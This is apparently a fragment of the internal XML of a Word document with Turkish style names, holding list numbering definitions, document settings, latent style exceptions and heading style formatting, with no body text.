    <w:lvl w:ilvl="1" w:tplc="098C87B0">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:color w:val="438086" w:themeColor="accent2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0C57BC7"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5064A2F4"/>
    <w:lvl w:ilvl="0" w:tplc="BDC83ACC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:cs="Wingdings" w:hint="default"/>
        <w:color w:val="325F64" w:themeColor="accent2" w:themeShade="BF"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="E896886C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  <w:color w:val="438086" w:themeColor="accent2"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="13C0FDF8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color w:val="83BBC1" w:themeColor="accent2" w:themeTint="99"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16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48785B94"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="33B056D0"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="216" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="A04DA3" w:themeColor="accent3"/>
        <w:sz w:val="18"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="461" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="438086" w:themeColor="accent2"/>
        <w:sz w:val="12"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="706" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="951" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1196" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1441" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1686" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1931" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2176" w:hanging="216"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="24" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="63E8022B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="33B056D0"/>
    <w:numStyleLink w:val="KentselMaddearetliListe"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="25" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6F0D0B31"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7AC6A14E"/>
    <w:numStyleLink w:val="KentselNumaralListe"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="26" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="72817FF1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="702CD21C"/>
    <w:lvl w:ilvl="0" w:tplc="0752545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  <w:color w:val="A04DA3" w:themeColor="accent3"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="F4389890">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:cs="Wingdings" w:hint="default"/>
        <w:color w:val="438086" w:themeColor="accent2"/>
        <w:sz w:val="12"/>
        <w:szCs w:val="12"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="9A9E4A9C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color w:val="53548A" w:themeColor="accent1"/>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="96863BBE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  <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="98987F98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  <w:sz w:val="16"/>
        <w:szCs w:val="16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76740294"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="33B056D0"/>
    <w:numStyleLink w:val="KentselMaddearetliListe"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="28" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="76921C5B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="33B056D0"/>
    <w:numStyleLink w:val="KentselMaddearetliListe"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="29" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="7E025C09"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="33B056D0"/>
    <w:numStyleLink w:val="KentselMaddearetliListe"/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9"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="28"/>
    <w:lvlOverride w:ilvl="0">
      <w:lvl w:ilvl="0">
        <w:numFmt w:val="decimal"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="1">
      <w:lvl w:ilvl="1">
        <w:numFmt w:val="decimal"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="2">
      <w:lvl w:ilvl="2">
        <w:numFmt w:val="decimal"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="3">
      <w:lvl w:ilvl="3">
        <w:numFmt w:val="decimal"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="4">
      <w:lvl w:ilvl="4">
        <w:start w:val="1"/>
        <w:numFmt w:val="bullet"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="1196" w:hanging="216"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
          <w:color w:val="53548A" w:themeColor="accent1"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="24"/>
    <w:lvlOverride w:ilvl="0">
      <w:lvl w:ilvl="0">
        <w:start w:val="1"/>
        <w:numFmt w:val="bullet"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="216" w:hanging="216"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A04DA3" w:themeColor="accent3"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="30">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="31">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="32">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="33">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="34">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="35">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="36">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="37">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="38">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="3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removeDateAndTime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evenAndOddHeaders/>
  <w:drawingGridHorizontalSpacing w:val="100"/>
  <w:displayHorizontalDrawingGridEvery w:val="2"/>
  <w:characterSpacingControl w:val="doNotCompress"/>
  <w:hdrShapeDefaults>
    <o:shapedefaults v:ext="edit" spidmax="2049" fillcolor="white">
      <v:fill color="white"/>
      <o:colormru v:ext="edit" colors="#334c4f,#79b5b0,#b77851,#d1e1e3,#066,#7ea8ac,#4e767a,#293d3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58B6"/>
    <w:rsid w:val="000004F6"/>
    <w:rsid w:val="000241B4"/>
    <w:rsid w:val="00034B27"/>
    <w:rsid w:val="00065ECB"/>
    <w:rsid w:val="0009348D"/>
    <w:rsid w:val="00095486"/>
    <w:rsid w:val="000B3ED5"/>
    <w:rsid w:val="000B7D88"/>
    <w:rsid w:val="000E38F7"/>
    <w:rsid w:val="000F2D3C"/>
    <w:rsid w:val="00102473"/>
    <w:rsid w:val="001067DF"/>
    <w:rsid w:val="001118C0"/>
    <w:rsid w:val="00112ED9"/>
    <w:rsid w:val="00124470"/>
    <w:rsid w:val="00133031"/>
    <w:rsid w:val="00167F25"/>
    <w:rsid w:val="00172277"/>
    <w:rsid w:val="0018091E"/>
    <w:rsid w:val="0019746D"/>
    <w:rsid w:val="001A4CB0"/>
    <w:rsid w:val="001B4F3D"/>
    <w:rsid w:val="001C1ADE"/>
    <w:rsid w:val="001D04F8"/>
    <w:rsid w:val="001F34EF"/>
    <w:rsid w:val="0020509E"/>
    <w:rsid w:val="00256432"/>
    <w:rsid w:val="00257B2F"/>
    <w:rsid w:val="0026359C"/>
    <w:rsid w:val="00295358"/>
    <w:rsid w:val="002D3720"/>
    <w:rsid w:val="002E7266"/>
    <w:rsid w:val="00301AE9"/>
    <w:rsid w:val="003039F6"/>
    <w:rsid w:val="0030794F"/>
    <w:rsid w:val="00342A48"/>
    <w:rsid w:val="0035237B"/>
    <w:rsid w:val="003859EF"/>
    <w:rsid w:val="003908B6"/>
    <w:rsid w:val="003A5D0D"/>
    <w:rsid w:val="003B31EA"/>
    <w:rsid w:val="003B70D1"/>
    <w:rsid w:val="003D00B4"/>
    <w:rsid w:val="003D0DEC"/>
    <w:rsid w:val="00400466"/>
    <w:rsid w:val="00400BEC"/>
    <w:rsid w:val="00440E24"/>
    <w:rsid w:val="00444F18"/>
    <w:rsid w:val="00473FD2"/>
    <w:rsid w:val="0047436E"/>
    <w:rsid w:val="004913D3"/>
    <w:rsid w:val="00496DAA"/>
    <w:rsid w:val="004A7E06"/>
    <w:rsid w:val="004E7938"/>
    <w:rsid w:val="004F79F0"/>
    <w:rsid w:val="005161D7"/>
    <w:rsid w:val="005221B7"/>
    <w:rsid w:val="00527BA7"/>
    <w:rsid w:val="0053281A"/>
    <w:rsid w:val="00536562"/>
    <w:rsid w:val="005439E0"/>
    <w:rsid w:val="00551D44"/>
    <w:rsid w:val="00555D5A"/>
    <w:rsid w:val="0056687C"/>
    <w:rsid w:val="00572492"/>
    <w:rsid w:val="00573096"/>
    <w:rsid w:val="0057362D"/>
    <w:rsid w:val="005843CA"/>
    <w:rsid w:val="00592FAF"/>
    <w:rsid w:val="005942CB"/>
    <w:rsid w:val="0059551C"/>
    <w:rsid w:val="005A1126"/>
    <w:rsid w:val="005B3F50"/>
    <w:rsid w:val="005D39FF"/>
    <w:rsid w:val="005E1EF5"/>
    <w:rsid w:val="005F2AAD"/>
    <w:rsid w:val="005F6837"/>
    <w:rsid w:val="00617671"/>
    <w:rsid w:val="00622365"/>
    <w:rsid w:val="00627B5A"/>
    <w:rsid w:val="00647D39"/>
    <w:rsid w:val="00664FC1"/>
    <w:rsid w:val="00675D85"/>
    <w:rsid w:val="00684B0D"/>
    <w:rsid w:val="006953A3"/>
    <w:rsid w:val="006A2CB8"/>
    <w:rsid w:val="006A325A"/>
    <w:rsid w:val="006E5A0F"/>
    <w:rsid w:val="006F1DB9"/>
    <w:rsid w:val="006F3D92"/>
    <w:rsid w:val="0070665C"/>
    <w:rsid w:val="00732217"/>
    <w:rsid w:val="00737DC6"/>
    <w:rsid w:val="0076120E"/>
    <w:rsid w:val="00772A06"/>
    <w:rsid w:val="0078132C"/>
    <w:rsid w:val="007B6EE3"/>
    <w:rsid w:val="007D2F8A"/>
    <w:rsid w:val="007F151E"/>
    <w:rsid w:val="00825613"/>
    <w:rsid w:val="00832895"/>
    <w:rsid w:val="00855F55"/>
    <w:rsid w:val="008661C7"/>
    <w:rsid w:val="00876FB0"/>
    <w:rsid w:val="00877BD1"/>
    <w:rsid w:val="008B4708"/>
    <w:rsid w:val="008B547F"/>
    <w:rsid w:val="008D0457"/>
    <w:rsid w:val="008D6D29"/>
    <w:rsid w:val="008E71F6"/>
    <w:rsid w:val="0091666D"/>
    <w:rsid w:val="00952618"/>
    <w:rsid w:val="00992B9B"/>
    <w:rsid w:val="009D70ED"/>
    <w:rsid w:val="009E361A"/>
    <w:rsid w:val="009F083A"/>
    <w:rsid w:val="00A0050A"/>
    <w:rsid w:val="00A10E5D"/>
    <w:rsid w:val="00A24F5A"/>
    <w:rsid w:val="00A45272"/>
    <w:rsid w:val="00A528E1"/>
    <w:rsid w:val="00A97677"/>
    <w:rsid w:val="00AA1223"/>
    <w:rsid w:val="00AB505A"/>
    <w:rsid w:val="00AB6478"/>
    <w:rsid w:val="00AD7169"/>
    <w:rsid w:val="00AF37DE"/>
    <w:rsid w:val="00B136B1"/>
    <w:rsid w:val="00B27C41"/>
    <w:rsid w:val="00B27F03"/>
    <w:rsid w:val="00B35980"/>
    <w:rsid w:val="00B3704C"/>
    <w:rsid w:val="00B40828"/>
    <w:rsid w:val="00B5519E"/>
    <w:rsid w:val="00B617AF"/>
    <w:rsid w:val="00B823AF"/>
    <w:rsid w:val="00BB56F9"/>
    <w:rsid w:val="00BC180D"/>
    <w:rsid w:val="00BC26C8"/>
    <w:rsid w:val="00BF03B9"/>
    <w:rsid w:val="00C123F4"/>
    <w:rsid w:val="00C154D8"/>
    <w:rsid w:val="00C220DB"/>
    <w:rsid w:val="00C25F47"/>
    <w:rsid w:val="00C47CF6"/>
    <w:rsid w:val="00CB3125"/>
    <w:rsid w:val="00CB5899"/>
    <w:rsid w:val="00CB6982"/>
    <w:rsid w:val="00CC27B9"/>
    <w:rsid w:val="00CC336A"/>
    <w:rsid w:val="00CC58B6"/>
    <w:rsid w:val="00CE34B4"/>
    <w:rsid w:val="00D20961"/>
    <w:rsid w:val="00D34FA1"/>
    <w:rsid w:val="00D50A42"/>
    <w:rsid w:val="00D75FD8"/>
    <w:rsid w:val="00DA43FF"/>
    <w:rsid w:val="00DD1A3B"/>
    <w:rsid w:val="00DD789B"/>
    <w:rsid w:val="00DE73A7"/>
    <w:rsid w:val="00DF14E6"/>
    <w:rsid w:val="00DF1BEB"/>
    <w:rsid w:val="00E1774D"/>
    <w:rsid w:val="00E20390"/>
    <w:rsid w:val="00E20796"/>
    <w:rsid w:val="00E51C4B"/>
    <w:rsid w:val="00E553DD"/>
    <w:rsid w:val="00E743DF"/>
    <w:rsid w:val="00EF2406"/>
    <w:rsid w:val="00F07085"/>
    <w:rsid w:val="00F10776"/>
    <w:rsid w:val="00F22254"/>
    <w:rsid w:val="00F2742B"/>
    <w:rsid w:val="00F36BF8"/>
    <w:rsid w:val="00F5118F"/>
    <w:rsid w:val="00F5511D"/>
    <w:rsid w:val="00F72F72"/>
    <w:rsid w:val="00F93800"/>
    <w:rsid w:val="00FB3A21"/>
    <w:rsid w:val="00FD0941"/>
    <w:rsid w:val="00FD5873"/>
    <w:rsid w:val="00FF26FF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  <o:colormru v:ext="edit" colors="#334c4f,#79b5b0,#b77851,#d1e1e3,#066,#7ea8ac,#4e767a,#293d3f"/>
    </o:shapedefaults>
    <o:shapelayout v:ext="edit">
      <o:idmap v:ext="edit" data="1"/>
    </o:shapelayout>
  </w:shapeDefaults>
  <w:decimalSymbol w:val=","/>
  <w:listSeparator w:val=";"/>
  <w14:docId w14:val="28BF1F83"/>
  <w15:docId w15:val="{FD81E6F0-9CAD-4B33-B738-0F5169CCE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HAns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uiPriority="3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iPriority="0"/>
    <w:lsdException w:name="List Paragraph" w:uiPriority="36" w:qFormat="1"/>
    <w:lsdException w:name="Quote" w:uiPriority="29" w:qFormat="1"/>
    <w:lsdException w:name="Intense Quote" w:uiPriority="30" w:qFormat="1"/>
    <w:lsdException w:name="Medium List 2 Accent 1" w:uiPriority="41"/>
    <w:lsdException w:name="Medium Grid 1 Accent 1" w:uiPriority="41"/>
    <w:lsdException w:name="Medium Grid 2 Accent 1" w:uiPriority="41"/>
    <w:lsdException w:name="Medium Grid 3 Accent 1" w:uiPriority="41"/>
    <w:lsdException w:name="Dark List Accent 1" w:uiPriority="41"/>
    <w:lsdException w:name="Colorful Shading Accent 1" w:uiPriority="41"/>
    <w:lsdException w:name="Colorful List Accent 1" w:uiPriority="41"/>
    <w:lsdException w:name="Colorful Grid Accent 1" w:uiPriority="41"/>
    <w:lsdException w:name="Light Shading Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Light List Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Light Grid Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Medium Shading 1 Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Medium Shading 2 Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Medium List 1 Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Medium List 2 Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Medium Grid 1 Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Medium Grid 2 Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Medium Grid 3 Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Dark List Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Colorful Shading Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Colorful List Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Colorful Grid Accent 2" w:uiPriority="42"/>
    <w:lsdException w:name="Light Shading Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Light List Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Light Grid Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Medium Shading 1 Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Medium Shading 2 Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Medium List 1 Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Medium List 2 Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Medium Grid 1 Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Medium Grid 2 Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Medium Grid 3 Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Dark List Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Colorful Shading Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Colorful List Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Colorful Grid Accent 3" w:uiPriority="43"/>
    <w:lsdException w:name="Light Shading Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Light List Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Light Grid Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Medium Shading 1 Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Medium Shading 2 Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Medium List 1 Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Medium List 2 Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Medium Grid 1 Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Medium Grid 2 Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Medium Grid 3 Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Dark List Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Colorful Shading Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Colorful List Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Colorful Grid Accent 4" w:uiPriority="44"/>
    <w:lsdException w:name="Light Shading Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Light List Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Light Grid Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Medium Shading 1 Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Medium Shading 2 Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Medium List 1 Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Medium List 2 Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Medium Grid 1 Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Medium Grid 2 Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Medium Grid 3 Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Dark List Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Colorful Shading Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Colorful List Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Colorful Grid Accent 5" w:uiPriority="45"/>
    <w:lsdException w:name="Light Shading Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Light List Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Light Grid Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Medium Shading 1 Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Medium Shading 2 Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Medium List 1 Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Medium List 2 Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Medium Grid 1 Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Medium Grid 2 Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Medium Grid 3 Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Dark List Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Colorful Shading Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Colorful List Accent 6" w:uiPriority="46"/>
    <w:lsdException w:name="Colorful Grid Accent 6" w:uiPriority="4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0"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Balk1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Balk1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="4" w:space="1" w:color="438086" w:themeColor="accent2"/>
      </w:pBdr>
      <w:spacing w:before="360" w:after="80"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:color w:val="438086" w:themeColor="accent2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qFormat/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:color w:val="438086" w:themeColor="accent2"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Balk3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Balk3Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:color w:val="438086" w:themeColor="accent2"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24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pPr>
      <w:spacing w:after="0"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:i/>
      <w:color w:val="438086" w:themeColor="accent2"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22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pPr>
      <w:spacing w:after="0"/>
      <w:outlineLvl w:val="4"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:b/>
      <w:color w:val="325F64" w:themeColor="accent2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pPr>
      <w:spacing w:after="0"/>
      <w:outlineLvl w:val="5"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:b/>
      <w:i/>
      <w:color w:val="325F64" w:themeColor="accent2" w:themeShade="BF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pPr>
      <w:spacing w:after="0"/>
      <w:outlineLvl w:val="6"/>
    </w:pPr>
    <w:rPr>
